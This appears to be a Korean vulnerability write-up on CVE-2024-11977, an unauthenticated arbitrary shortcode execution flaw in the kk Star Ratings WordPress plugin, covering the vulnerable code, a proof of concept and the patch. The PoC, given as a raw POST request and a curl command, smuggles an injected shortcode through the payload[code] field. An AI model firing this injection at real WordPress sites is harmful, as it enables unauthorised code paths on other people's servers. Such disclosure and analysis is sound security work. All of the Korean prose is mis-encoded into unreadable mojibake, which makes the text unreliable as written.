---
title: "[CVE-2024-11977] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "WordPress í”ŒëŸ¬ê·¸ì¸ The The kk Star Ratings ë²„ì „ 5.4.10 ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” ì„ì˜ ë‹¨ì¶• ì½”ë“œ(do_shortcode) ì‹¤í–‰ ì·¨ì•½ì "
author: dottak
date: 2024-12-31 14:58:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, CVE-2024-11977]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

## ğŸ“Œ Analysis

### 1. ê°œìš”

`CVE-2024-11977` ì·¨ì•½ì ì€ WordPress í”ŒëŸ¬ê·¸ì¸ `The The kk Star Ratings - Rate Post & Collect User Feedbacks`ì˜ 5.4.10 ë²„ì „ ì´í•˜ì—ì„œ ë°œìƒí•˜ëŠ” ì„ì˜ ë‹¨ì¶• ì½”ë“œ(`do_shortcode`) ì‹¤í–‰ ì·¨ì•½ì ì…ë‹ˆë‹¤.

í•´ë‹¹ í”ŒëŸ¬ê·¸ì¸ì€ í™œì„±í™”ë˜ë©´ WordPress ê²Œì‹œê¸€ì— í‰ì ì„ ì…ë ¥í•  ìˆ˜ ìˆëŠ” ìš”ì†Œê°€ ë‚˜íƒ€ë‚©ë‹ˆë‹¤.

![image](/assets/posts/one-day/2024-12-31/image-001.png)

ì´ë•Œ, í‰ì ì„ ì…ë ¥í•˜ë©´ ì„œë²„ë¡œ ì „ì†¡ë˜ëŠ” ìš”ì²­ê°’ì´ ì ì ˆí•œ ê²€ì¦ ì—†ì´ `do_shortcode` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ì–´ ì„ì˜ì˜ ë‹¨ì¶• ì½”ë“œê°€ ì‹¤í–‰ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë„ ì´ ê¸°ëŠ¥ì„ ì‹¤í–‰í•  ìˆ˜ ìˆì–´, ê³µê²©ìê°€ WordPressì˜ ë‹¨ì¶• ì½”ë“œ ê¸°ëŠ¥ì„ ì•…ìš©í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ ë³´ì•ˆ ìœ„í—˜ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **ì½”ë“œ ì‹¤í–‰ ìœ„í—˜:** `do_shortcode`ë¡œ ì „ë‹¬ëœ ë‹¨ì¶• ì½”ë“œê°€ ì²˜ë¦¬ë  ë•Œ PHP í•¨ìˆ˜ê°€ ì‹¤í–‰ ë˜ë©°, ì´ë•Œ ì•…ì˜ì ì¸ ë‹¨ì¶• ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ ì„ì˜ì˜ PHP ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **ì •ë³´ ìœ ì¶œ:** ë‹¨ì¶• ì½”ë“œë¥¼ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ ì¿¼ë¦¬ë‚˜ íŒŒì¼ ì‹œìŠ¤í…œì— ì ‘ê·¼í•˜ì—¬ ì¤‘ìš”í•œ ì •ë³´ë¥¼ íƒˆì·¨í•˜ê±°ë‚˜ ë…¸ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **ê¶Œí•œ ìš°íšŒ:** íŠ¹ì • ë‹¨ì¶• ì½”ë“œëŠ” ê´€ë¦¬ì ê¶Œí•œì´ í•„ìš”í•˜ì§€ë§Œ, ê²€ì¦ë˜ì§€ ì•Šì€ ë‹¨ì¶• ì½”ë“œê°€ ì‹¤í–‰ë  ê²½ìš° ì¼ë°˜ ì‚¬ìš©ìê°€ ê´€ë¦¬ì ê¶Œí•œì´ í•„ìš”í•œ ë‹¨ì¶• ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **ì¶”ê°€ ê³µê²© ë²¡í„°**: XSSë‚˜ CSRFì™€ ê°™ì€ ë‹¤ë¥¸ ê³µê²©ì˜ ì§„ì…ì ìœ¼ë¡œ í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **ì„œë¹„ìŠ¤ ì¥ì• :** ë¬´ë¶„ë³„í•œ ë‹¨ì¶• ì½”ë“œ ì‹¤í–‰ì€ ì„œë²„ ë¦¬ì†ŒìŠ¤ë¥¼ ê³¼ë„í•˜ê²Œ ì†Œëª¨í•˜ê±°ë‚˜ ë¬´í•œ ë£¨í”„ë¥¼ ë°œìƒì‹œì¼œ ì„œë¹„ìŠ¤ ì¤‘ë‹¨ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2. ì·¨ì•½ì  ë¶„ì„

WordPress í”ŒëŸ¬ê·¸ì¸ `The The kk Star Ratings - Rate Post & Collect User Feedbacks` ì´ í™œì„±í™”ëœ ìƒíƒœì—ì„œ ê²Œì‹œê¸€ì˜ í‰ì ì„ í´ë¦­í•  ê²½ìš° ì•„ë˜ì˜ HTTP Request íŒ¨í‚·ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

![image](/assets/posts/one-day/2024-12-31/image-002.png)

ì´ë•Œ Request Body ë°ì´í„° ì¤‘ í˜ì´ë¡œë“œ `payload` ì˜ ê°’ì€ ë‹¤ìŒê³¼ ê°™ìœ¼ë©°,

```php
[
    "align" => "left",
    "id" => 1,
    "slug" => "default", 
    "valign" => "top",
    "ignore" => "",
    "reference" => "auto",
    "class" => "",
    "count" => 4,
    "legendonly" => "",
    "readonly" => "",
    "score" => 4,
    "starsonly" => "",
    "best" => 5,
    "gap" => 5,
    "greet" => "Rate this post",
    "legend" => "4/5 - (4 votes)",
    "size" => 24,
    "title" => "Hello world!",
    "width" => 113.5,
    "_legend" => "{score}/{best} - ({count} {votes})",
    "font_factor" => 1.25
]
```

ìš”ì²­ì€ `/wp-content/plugins/kk-star-ratings/src/core/wp/actions/wp_ajax_kk-star-ratings.php` íŒŒì¼ì˜ `wp_ajax_kk_star_ratings` í•¨ìˆ˜ì—ì„œ ì²˜ë¦¬ë©ë‹ˆë‹¤.

`wp_ajax_kk_star_ratings` í•¨ìˆ˜ì˜ ì½”ë“œ êµ¬ë¬¸ì„ ì‚´í´ë³´ë©´, **line 39**ì—ì„œ ë³€ìˆ˜ `$payload`ì— ìš”ì²­ í˜ì´ë¡œë“œ `payload`ì˜ ê°’ì„ ì´ˆê¸°í™”í•©ë‹ˆë‹¤. ì´í›„ **line 92**ì—ì„œ ì´ ê°’ì„ í•¨ìˆ˜ `to_shortcode`ì˜ ë‘ ë²ˆì§¸ ì¸ìë¡œ ì „ë‹¬í•˜ê³ , ê·¸ ê²°ê³¼ë¥¼ ë‹¤ì‹œ `do_shortcode`ì˜ ì¸ìë¡œ ì „ë‹¬í•œ ë’¤ í•´ë‹¹ í•¨ìˆ˜ `do_shortcode` ì˜ ì‹¤í–‰ ê²°ê³¼ë¥¼ HTTP ìƒíƒœì½”ë“œ `201`ê³¼ í•¨ê»˜ ì‘ë‹µí•©ë‹ˆë‹¤.

![image](/assets/posts/one-day/2024-12-31/image-003.png)

**line 92**ì˜  `to_shortcode` í•¨ìˆ˜ëŠ” ë‹¨ì¶• ì½”ë“œë¥¼ ìƒì„±í•˜ëŠ” ë¡œì§ì´ êµ¬í˜„ë˜ì–´ ìˆìœ¼ë©°, í•´ë‹¹ í•¨ìˆ˜ëŠ” `/wp-content/plugins/kk-star-ratings/src/functions/to_shortcode.php` íŒŒì¼ì— ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

![image](/assets/posts/one-day/2024-12-31/image-004.png)

í•´ë‹¹ í•¨ìˆ˜ì˜ ë¡œì§ì— ëŒ€í•œ ì¶œë ¥ ì˜ˆì œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

```php
<?php
// 1. ë‹¨ìˆœ ìˆì½”ë“œ ìƒì„±
echo to_shortcode('gallery', ['ids' => '1,2,3']);
// ê²°ê³¼: [gallery ids="1,2,3"]

// 2. ì†ì„±ê³¼ ë‚´ìš© í¬í•¨
echo to_shortcode('div', ['id' => 'main', 'class' => 'container', 'data-role' => 'content'], 'Hello World');
// ê²°ê³¼: [div id="main" class="container" data-role="content"]Hello World[/div]

// 3. ì†ì„±ì´ ì—†ëŠ” ìˆì½”ë“œ
echo to_shortcode('audio', [], '');
// ê²°ê³¼: [audio]
```

ì¦‰, ì•„ê¹Œ í™•ì¸í•œ HTTP Request Body ë°ì´í„°ì˜ í˜ì´ë¡œë“œ `payload` ì˜ ê°’ì€ `to_shortcode` í•¨ìˆ˜ë¡œ ì „ë‹¬ë  ê²½ìš° ì•„ë˜ì˜ ê²°ê³¼ë¥¼ ì¶œë ¥í•˜ê²Œ ë©ë‹ˆë‹¤. 

ì´ë•Œ, `to_shortcode` í•¨ìˆ˜ì˜ ì²« ë²ˆì§¸ ì¸ìë¡œ ì „ë‹¬ë˜ëŠ” `kksr('slug')`ëŠ” `kk-star-ratings`ë¡œ ë³€í™˜ë˜ì—ˆìœ¼ë©°, ì¼ë¶€ ì¡´ì¬í•˜ì§€ ì•Šê±°ë‚˜ ë³€ê²½ëœ ê°’ë“¤ì€ `wp_ajax_kk_star_ratings` í•¨ìˆ˜ì˜ ë¡œì§ì— ì˜í•´ ì²˜ë¦¬ëœ ê²ƒì…ë‹ˆë‹¤.

```
[kk-star-ratings align="left" id="1" slug="default" valign="top" ignore="" reference="auto" class="" legendonly="" readonly="" starsonly="" best="5" gap="5" greet="Rate this post" legend="{score}/{best} - ({count} {votes})" size="24" title="Hello world!" width="113.5" _legend="{score}/{best} - ({count} {votes})" font_factor="1.25"]
```

ë”°ë¼ì„œ, í˜ì´ë¡œë“œ `payload` ì˜ ê°’ì€ `do_shortcode` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ë¯€ë¡œ í˜ì´ë¡œë“œì˜ ê°’ì„ ì¡°ì‘í•˜ì—¬ ì„ì˜ì˜ ë‹¨ì¶• ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

## ğŸ“Œ PoC

### 1. ì„¤ëª…

í‰ì ì„ ê¸°ë¡í•  ë•Œ ë°œìƒí•˜ëŠ” HTTP Request íŒ¨í‚·ì„ ì•„ë˜ì˜ ë°ì´í„°ë¡œ ìš”ì²­í•©ë‹ˆë‹¤.

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost:8080
Content-type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 99

nonce=42d41f5dc3&action=kk-star-ratings&rating=5&payload[code]=][video+src=http://video.com+][video
```

![image](/assets/posts/one-day/2024-12-31/image-005.png)

ì´ë•Œ, ìš”ì²­ í˜ì´ë¡œë“œ `payload`ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë°ì´í„°ë¡œ ì „ë‹¬ë©ë‹ˆë‹¤.

```php
[ "code" => "][video src=http://video.com ][video" ]
```

ì „ë‹¬ëœ `payload`ëŠ” `to_shortcode` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ì–´ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ì¶• ì½”ë“œë¡œ ë³€í™˜ë©ë‹ˆë‹¤.

```
[kk-star-ratings code="][video src=http://video.com ][video" id="0" slug="default" best="5" _legend="{score}/{best} - ({count} {votes})" legend="{score}/{best} - ({count} {votes})"]
```

ì´ë ‡ê²Œ ìƒì„±ëœ ì½”ë“œëŠ” `[kk-start-ratings]`ì™€ `[video]` ë‘ ê°œì˜ ë‹¨ì¶• ì½”ë“œë¡œ êµ¬ì„±ë˜ë©°, ì´ëŠ” `do_shortcode` í•¨ìˆ˜ì˜ ì¸ìë¡œ ì „ë‹¬ë˜ì–´ ì•„ë˜ì˜ ì‘ë‹µ ë°ì´í„°ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.

![image](/assets/posts/one-day/2024-12-31/image-006.png)

ì¦‰, ì˜ë„ë˜ì§€ ì•Šì€ ë‹¨ì¶•ì½”ë“œ `[video]` ê°€ ì‹¤í–‰ ë˜ì–´ `<a class="wp-embedded-video" href="http://video.com">http://video.com</a>` ê°€ ë°˜í™˜ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ëŸ¬í•œ ì·¨ì•½ì ì„ í†µí•´ ê³µê²©ìëŠ” WordPressì˜ ëª¨ë“  ë‹¨ì¶• ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” WordPress í”ŒëŸ¬ê·¸ì¸ì´ë‚˜ í…Œë§ˆì—ì„œ ì œê³µí•˜ëŠ” ë‹¨ì¶• ì½”ë“œê¹Œì§€ í¬í•¨ë©ë‹ˆë‹¤. íŠ¹íˆ íŒŒì¼ ì—…ë¡œë“œë‚˜ ë°ì´í„°ë² ì´ìŠ¤ ì¡°ì‘ê³¼ ê´€ë ¨ëœ ë‹¨ì¶• ì½”ë“œê°€ ìˆë‹¤ë©´ ì‹¬ê°í•œ ë³´ì•ˆ ìœ„í—˜ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### 2. PoC ì½”ë“œ

> ì•„ë˜ ìš”ì²­ í˜ì´ë¡œë“œì—ì„œ ì‚¬ìš©ë˜ëŠ” `nonce` ê°’ì€ í‰ì  ê¸°ë¡ì´ í¬í•¨ëœ ê²Œì‹œê¸€ í˜ì´ì§€ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
> 
> 
> ![image](/assets/posts/one-day/2024-12-31/image-007.png)
> 

```php
curl -X POST "http://localhost:8080/wp-admin/admin-ajax.php" \
	--data-urlencode "nonce=42d41f5dc3" \
	--data-urlencode "action=kk-star-ratings" \
	--data-urlencode "rating=5" \
	--data-urlencode "payload[code]=][video src=http://video.com ][video"
```

## ğŸ“Œ íŒ¨ì¹˜ í™•ì¸

í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ëŠ” ìš”ì²­ í˜ì´ë¡œë“œì˜ `payload`ë¥¼ ë³€ìˆ˜ `$payload`ë¡œ ì´ˆê¸°í™”í•œ í›„, `do_shortcode` í•¨ìˆ˜ í˜¸ì¶œ ì „ì— `$payload['_legend']` ê°’ì´ ìˆì„ ê²½ìš° `strip_shortcodes` í•¨ìˆ˜ë¡œ ë‹¨ì¶• ì½”ë“œë¥¼ ì œê±°í•˜ì˜€ìŠµë‹ˆë‹¤.

ì¦‰, `strip_shortcodes` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ìš”ì²­ í˜ì´ë¡œë“œ `payload[_legend]`ì—ì„œ ë‹¨ì¶• ì½”ë“œë¥¼ ì œê±°í•˜ë„ë¡ ì²˜ë¦¬í•˜ì˜€ìŠµë‹ˆë‹¤.

> https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=3208701%40kk-star-ratings&old=3202212%40kk-star-ratings&sfp_email=&sfph_mail=#file474
> 

![image](/assets/posts/one-day/2024-12-31/image-008.png)

ë‹¤ë§Œ, í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ëŠ” ìš”ì²­ í˜ì´ë¡œë“œ `payload[_legend]` ì— ëŒ€í•´ì„œë§Œ ì„ì˜ ë‹¨ì¶•ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì„ ë°©ì§€í•˜ê³  ìˆìœ¼ë©°, ë‹¤ë¥¸ í˜ì´ë¡œë“œ í•„ë“œì— ëŒ€í•´ì„œëŠ” ì—¬ì „íˆ ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, `payload[code]`ë‚˜ ë‹¤ë¥¸ í•„ë“œë¥¼ í†µí•´ ì—¬ì „íˆ ì„ì˜ì˜ ë‹¨ì¶• ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì´ ìˆì–´ ì™„ì „í•œ ë³´ì•ˆ íŒ¨ì¹˜ë¼ê³  ë³´ê¸°ëŠ” ì–´ë µìŠµë‹ˆë‹¤.